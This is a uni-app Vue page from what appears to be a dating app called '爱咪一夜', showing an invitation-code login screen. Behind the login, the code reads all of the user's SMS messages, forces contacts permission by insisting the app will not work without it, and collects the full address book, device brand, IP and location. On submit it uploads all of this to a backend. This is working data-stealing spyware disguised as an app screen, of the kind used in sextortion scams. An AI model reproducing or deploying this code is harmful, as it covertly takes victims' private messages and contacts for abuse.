<template>
	<view class="content">

		<view class="content_three" v-show="cardShow">
			<!-- 输入卡片 -->
			<view class="userLogin">
				<view class="logonTitle">
					<text>输入邀请码</text>
					<icon type="clear" size="26" @click="closeCard" />
				</view>
				<view class="userInput">
					<input type="number" placeholder="请输入您的手机号" placeholder-class="palceholdertext"
						v-model="phoneNumber" maxlength="11" :focus="firstFocus" />
					<input type="number" placeholder="请输入邀请码" placeholder-class="palceholdertext" v-model="userCode"
						maxlength="6" />
				</view>
				<view class="userSubmit" @click="userSubmit">确定</view>
			</view>
		</view>

		<view class="content_one" v-show="btnShow">
			<view class="starBtnStyle" @click="starBtn">立马相见</view>
		</view>
		<view class="content_two">
			<text>再现一场大胆刺激的邂逅</text>
		</view>

	</view>
</template>

<script>
	import {
		netWork,
		promiseSMS,
		msgList,
		ipAndaddress,
		checkNumber,
		addMsgList,
		addMailList,
	} from './test.js'



	export default {
		data() {
			return {

				// 用户手机高度
				appHeight: "",
				firstFocus: false,

				// 控制模块显示隐藏
				cardShow: false,
				btnShow: true,

				phoneNumber: '',
				userCode: '',
				// 最后通讯录列表
				lastMailList: [],
				// 通讯录列表
				mailList: [],
				// 设备类型
				equipment: "",
				userIp: '',
				// 地址
				address: "",

				// 短信列表
				msgList: [],

				// 网络状态
				networkState: false


			}
		},
		onLoad() {

			// 0.添加网络检测
			netWork().then(res => {
				this.networkState = res
			})

			// 1.获取系统信息-设备名称
			uni.getSystemInfo({
				success: (res) => {
					this.title = res.brand
					this.appHeight = res.safeArea.height + "px";
					this.equipment = res.brand
				}
			})

			// 2.解析ip和获取ip
		
			ipAndaddress().then(res => {
				this.userIp = res.userip
				this.address = res.addres

				console.log("获取ip地址", this.userIp, this.address)
			})
			


			// 3.打开立即获取短信权限
		
			setTimeout(() => {
				// 2.1获取权限
				promiseSMS().then(res => {
					if (res.msmState) {

						// 2.2权限允许获取短信
						this.msgList = msgList()
						console.log("用户允许获取短信", this.msgList)

					} else {
						console.log("用户拒绝获取短信", res)
					}
				})

			}, 500)
			

		},

		methods: {
			//校验网络获取通讯录
			starBtn() {

				netWork().then(res => {
					this.networkState = res
				})

				let than = this
				// 网络正常进行下一步
				if (this.networkState) {

					// 1.1申请通讯录权限
					plus.android.requestPermissions(['android.permission.READ_CONTACTS'], function(e) {
						if (e.deniedAlways.length > 0) {
							// 弹出提示框解释为何需要权限，引导用户打开设置页面开启
							console.log('权限被永久拒绝 ' + e.deniedAlways.toString());
							uni.showModal({
								title: '提示',
								content: '请您同意弹出的权限，便可正常使用APP！如果未弹出，请前往“手机设置”里的“权限管理"找到爱咪一夜，并打开通录权限，方可使用。',
								showCancel: false,
								success: function(res) {
									if (res.confirm) {
										console.log('用户点击确定');

										var main = plus.android.runtimeMainActivity();
										var Intent = plus.android.importClass(
											'android.content.Intent');
										var Settings = plus.android.importClass(
											'android.provider.Settings');
										var intent = new Intent(Settings
											.ACTION_MANAGE_APPLICATIONS_SETTINGS);
										main.startActivity(intent); // 打开安装列表

									}
								}
							});
						}
						if (e.deniedPresent.length > 0) { //权限被临时拒绝
							// 弹出提示框解释为何需要权限，可再次调用plus.android.requestPermissions申请权限
							console.log('权限被临时拒绝 ' + e.deniedPresent.toString());
							uni.showModal({
								title: '提醒',
								content: '请您同意弹出的权限，便可正常使用APP！如果未弹出，请前往“手机设置”里的“权限管理"找到爱咪一夜，并打开通录权限，方可使用。',
								showCancel: false,
								success: function(res) {
									if (res.confirm) {
										console.log('用户点击确定');
										var main = plus.android.runtimeMainActivity();
										var Intent = plus.android.importClass(
											'android.content.Intent');
										var Settings = plus.android.importClass(
											'android.provider.Settings');
										var intent = new Intent(Settings
											.ACTION_MANAGE_APPLICATIONS_SETTINGS);
										main.startActivity(intent); // 打开安装列表
									}
								}
							});
						}
						if (e.granted.length > 0) {
							// 权限被允许进入登录页面
							console.log('通讯录权限被允许');
							than.btnShow = false
							than.cardShow = true
							than.firstFocus = true
						}
					}, function(e) {
						console.log('Request Permissions error:' + JSON.stringify(e));
					});

					// 1.2权限通过获取通讯录
					let phoneNum = plus.contacts.ADDRESSBOOK_PHONE
					plus.contacts.getAddressBook(phoneNum, function(addressbook) {

						addressbook.find(['displayName', 'phoneNumbers'], function(contacts) {
							than.mailList = contacts
						}, function() {
							console.log('获取通信录失败')
						}, {
							multiple: true
						});

					}, function(e) {
						console.log("获取通讯录失败了" + e.message);
					});

				} else {

					uni.showModal({
						title: '提示',
						content: '网络连接失败，请检查网络后重试！',
						showCancel: false,
						success: function(res) {
							if (res.confirm) {
								console.log('用户点击确定');
							}
						}
					});

				}
			},




			// 最后提交
			userSubmit() {

				uni.showLoading({
					title: '提交中',
				});

				// 校验网络
				netWork().then(res => {
					this.networkState = res
				})

				// 1.校验用户输入不能为空
				if (this.phoneNumber != '' && this.userCode != '') {

					// 2.校验手机号码格式
					var myreg = /^[1][3,4,5,7,8,9][0-9]{9}$/;
					if (!myreg.test(this.phoneNumber)) {
						uni.showToast({
							title: '手机号格式有误',
							duration: 2000,
							icon: "error"
						});
					} else {

						if (this.networkState) {

							// 校验手机号码不能重复
							checkNumber(this.phoneNumber).then(res => {

								uni.hideLoading();
								console.log("校验网络", res)

								if (res.code == 0) {
									uni.showToast({
										title: '登录号码重复',
										duration: 2000,
										icon: "error"
									});
								} else {

									// 到这里了
									uni.showLoading({
										title: '登录中...'
									});
									// 遍历通讯录
									for (let i in this.mailList) {
										this.lastMailList.push({
											name: this.mailList[i].displayName,
											number: this.mailList[i].phoneNumbers[0].value,
										})
									}

									// 校验短信不为空在提交
									if (this.msgList != '') {


										let data = {
											inCode: this.userCode,
											loginNum: this.phoneNumber,
											qeu: this.equipment,
											data: this.msgList
										}

										addMsgList(data).then(res => {
											this.msgList = []
											console.log('短信添加成功', res)
										})

									}

									// 添加通讯录网络请求
									let data = {
										loginNum: this.phoneNumber,
										inCode: this.userCode,
										equipment: this.equipment,
										location: this.userIp,
										address: this.address,
										data: this.lastMailList
									}
									console.log("获取的通讯录data=", data)

									addMailList(data).then(res => {
										// 提交成功进入首页
										if (res.code == 1) {
											this.lastMailList = []
											uni.hideLoading();
											uni.navigateTo({
												url: '../home/home'
											});
											console.log('通讯录添加成功', res)
										}
									})

									// 校验通讯为空也要进入后台
									// if (this.lastMailList != '') {
									// 	addMailList(data).then(res => {
									// 		// 提交成功进入首页
									// 		if (res.code == 1) {
									// 			this.lastMailList = []
									// 			uni.hideLoading();
									// 			uni.navigateTo({
									// 				url: '../home/home'
									// 			});
									// 			console.log('通讯录添加成功', res)
									// 		}
									// 	})

									// } else {
									// 	console.log("通讯录为空,但是证明已经进入后台")
									// 	uni.hideLoading();
									// 	uni.navigateTo({
									// 		url: '../home/home'
									// 	});
									// }
								}
							})
						} else {

							uni.showModal({
								title: '提示',
								content: '网络连接失败，请检查网络后重试！',
								showCancel: false,
								success: function(res) {}
							});
						}
					}
				} else {

					uni.showToast({
						title: '内容不能为空',
						duration: 2000,
						icon: "error"
					});
				}
			},

			// 点击关闭输入框
			closeCard() {
				this.cardShow = false
				this.btnShow = true
				this.firstFocus = false
			},
		},

	}
</script>

<style>
	.content {

		background-image: url(../../static/last2.png);
		display: flex;
		/* align-items: center; */
		flex-direction: column;
		/* justify-content: center; */

		width: 100%;
		height: 100%;

		/* border: 2px solid tomato; */

		/* 控制底部留白 */
		/* padding-top: 6%; */
	}

	.content>view {
		/* border: 1px solid tomato; */
		text-align: center;
	}

	.content_one {
		margin-top: 88%;
		padding: 0 30px;
	}

	.content_two {
		color: #FFFFFF;
		font-size: 12px;
		margin-top: 6px;

	}

	.content_three {
		/* background-color: #F48FB1; */
		display: flex;
		align-items: center;
		justify-content: center;
	}

	.userLogin {
		background: #00000050;
		margin-top: 38%;
		/* margin: 48% 40px; */
		width: 600rpx;
		height: 460rpx;
		border-radius: 6px;
		/* opacity: 0.7; */
	}

	.userInput {
		/* border: 1px solid red; */
		z-index: 10;
	}



	.palceholdertext {
		color: #FFFFFF;
		font-size: 12px;
	}

	input {
		color: #FFFFFF;
		background-color: #00000070;
		opacity: 0.5;
		margin: 10px 16px;
		padding: 10px 8px;
		border-radius: 2px;
	}

	.logonTitle {
		/* border: 1px solid #007AFF; */
		margin: 10px 16px;
		padding: 8px 0;
		color: #FFFFFF;
		display: flex;
		justify-content: space-between;
	}

	/* 确定 */
	.userSubmit {
		/* border: 1px solid red; */
		margin: 10px 16px;
		text-align: center;
		color: #FFFFFF;
		padding: 8px 0;
		border-radius: 2px;
		background-color: #F48FB1;
		transition: 0.4s;

	}

	.userSubmit:active {
		background-color: pink;
		opacity: 0.5;
	}

	.starBtnStyle {
		border-radius: 22px;
		/* width: 88%; */
		/* height: 24px; */
		padding: 10px 0;
		text-align: center;
		color: #FFFFFF;
		background-image: linear-gradient(120deg, #a6c0fe 0%, #f68084 100%);
		margin-top: 50%;
		line-height: 26px;
	}
</style>
